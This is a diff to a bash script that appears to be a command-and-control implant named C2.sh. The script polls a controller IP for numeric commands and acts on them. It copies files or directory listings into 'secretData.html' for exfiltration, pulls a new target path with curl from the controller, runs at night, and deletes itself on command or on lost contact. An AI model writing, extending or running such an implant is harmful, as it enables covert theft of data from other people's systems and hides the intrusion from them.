@@ -7,6 +7,10 @@ W/out cron version
 ip_addr=$1
 text_path=/../
 image_name="mainImage.png"
+
+#testing vars:
+wait_time=100
+
 while true
 do
     current=$(date +%s)
@@ -15,10 +19,8 @@ do
     #check if there is an image, if not assume connection is broken and delete self
     if [[ 100 < 1 ]]; then
         echo "image hasn't been uploaded"
-
         #remove scripts
-        rm C2.sh
-
+        rm $0
         echo "delete" 
         exit
     fi
@@ -33,29 +35,28 @@ do
 
     echo $cmnd
     #Follow according to that command
-    if [ $cmnd = "0000" ]; then #post data
+    if [ $cmnd = "0000" ]; then #post data pointed to by $text_path
         echo "post"
-        #Need to know where vulnerable data is
-        touch "secretData.html" #TODO: fix this
+        #post secret data to website 
+        touch "secretData.html" 
         if [ -d $text_path ]; then
             dir=$(ls $text_path*)
             echo $dir > "secretData.html"
         elif [ -f $text_path ]; then #file
             cat $text_path > "secretData.html"
         fi
-        #post secret data to website
 
         #sleep for 1 hour
-        sleep 3600
+        sleep $wait_time
+        echo "deleting secretData"
         rm -f secretData.html
     #elif: change ip address
-    #elif: sendback directories
     elif [ $cmnd = "1111" ]; then #Delete self
         #delete all mentions in crontainer
         #remove scripts
-        rm C2.sh
-
+        rm $0
         echo "delete" 
+        exit
     elif [ $cmnd = "1101" ]; then #change file path
         echo "change path"
         text_path=$(curl http://$ip_addr:8000/path.html) 
@@ -63,21 +64,22 @@ do
     elif [ $cmnd = "1011" ]; then #send back directory
         echo "get directory"
         dir=$(ls $text_path*)
-        
         echo $dir > "secretData.html"
-        sleep 300
+
+        sleep $wait_time
+        echo "deleting secretData"
         rm secretData.html
     fi
 
 
-    #Sleep until next night
+    #calculate number of seconds to sleep until next night
     current=$(date +%s)
-    echo "current: $current"
     target=$(date -d 'tomorrow 1:30' +%s)
     sleep_seconds=$(( $target - $current ))
     echo "sleep $sleep_seconds"
 
-    #Testing for now sleep 5 minutes
-    sleep 300
+    #Testing for now sleep 100 seconds, 
+    #after testing, change to sleep $sleep_seconds
+    sleep $wait_time
 
 done
